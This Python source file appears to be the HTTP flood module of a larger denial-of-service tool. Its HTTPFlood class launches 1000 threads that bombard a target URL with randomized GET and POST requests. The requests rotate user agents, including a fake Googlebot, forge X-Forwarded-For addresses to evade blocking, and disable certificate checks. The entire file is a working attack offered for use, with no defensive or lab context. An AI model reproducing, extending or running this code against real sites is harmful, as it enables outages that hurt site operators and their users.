"""
HTTP Flood Attack Handler
"""

import requests
import threading
import time
import random
from urllib.parse import urlparse

class HTTPFlood:
    def __init__(self):
        self.name = "HTTP FLOOD"
        self.running = False
        self.stats = {
            'packets': 0,
            'errors': 0,
            'threads': 0
        }
        self.target = None
        self.threads = []
        self.session = requests.Session()
        
        # Disable SSL warnings
        requests.packages.urllib3.disable_warnings()
    
    def get_headers(self):
        """Generate random headers"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
        ]
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # Add random X-Forwarded-For
        headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        return headers
    
    def flood_worker(self, worker_id, threads_per_sec):
        """HTTP flood worker"""
        local_session = requests.Session()
        local_session.verify = False
        
        while self.running:
            try:
                # Random path
                parsed = urlparse(self.target)
                path = parsed.path if parsed.path else '/'
                
                if random.random() > 0.3:
                    # Random parameters
                    params = {
                        'q': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)),
                        'id': random.randint(1, 10000),
                        't': str(time.time())
                    }
                    
                    response = local_session.get(
                        self.target,
                        params=params,
                        headers=self.get_headers(),
                        timeout=2
                    )
                else:
                    # POST with random data
                    data = {
                        'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=100)),
                        'submit': '1'
                    }
                    
                    response = local_session.post(
                        self.target,
                        data=data,
                        headers=self.get_headers(),
                        timeout=2
                    )
                
                self.stats['packets'] += 1
                
                # Rate limiting
                if threads_per_sec > 0:
                    time.sleep(1.0 / threads_per_sec)
                
            except Exception:
                self.stats['errors'] += 1
                local_session = requests.Session()
                local_session.verify = False
    
    def start(self, target, threads_config, main_tool):
        """Start HTTP flood attack"""
        self.running = True
        self.target = target
        
        print(f"\n{self.name} attack started on {target}")
        
        threads_per_sec = threads_config
        worker_count = 1000
        
        if threads_per_sec == 0:
            thread_delay = 0
        else:
            thread_delay = 1.0 / threads_per_sec
        
        # Start workers
        for i in range(worker_count):
            if not self.running:
                break
            
            thread = threading.Thread(
                target=self.flood_worker,
                args=(i, threads_per_sec)
            )
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
            self.stats['threads'] = len(self.threads)
            
            if thread_delay > 0:
                time.sleep(thread_delay)
        
        while self.running and main_tool.running:
            time.sleep(1)
    
    def stop(self):
        """Stop HTTP flood"""
        self.running = False
    
    def get_stats(self):
        """Get current statistics"""
        return self.stats
